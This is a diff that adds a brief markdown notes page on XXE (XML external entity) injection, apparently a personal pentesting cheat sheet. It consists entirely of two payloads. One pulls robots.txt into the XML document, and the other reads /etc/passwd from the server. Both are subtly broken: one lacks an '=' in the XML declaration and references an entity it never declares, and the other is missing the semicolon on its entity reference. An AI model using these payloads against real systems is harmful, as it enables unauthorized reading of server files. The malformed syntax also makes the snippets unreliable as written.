@@ -1,0 +1,26 @@
+---
+layout: default
+title: XXE
+nav_order: 2
+permalink: /notes/xxe
+---
+
+1. TOC
+{:toc}
+
+
+# Dump file using entity injection:
+```
+<?xml version"1.0"?>
+<!DOCTYPE change-log [
+<!ENTITY systemEntity SYSTEM "robots.txt"> ]>
+<change-log><text>&var;</text>
+</change-log>
+```
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe</foo>
+```
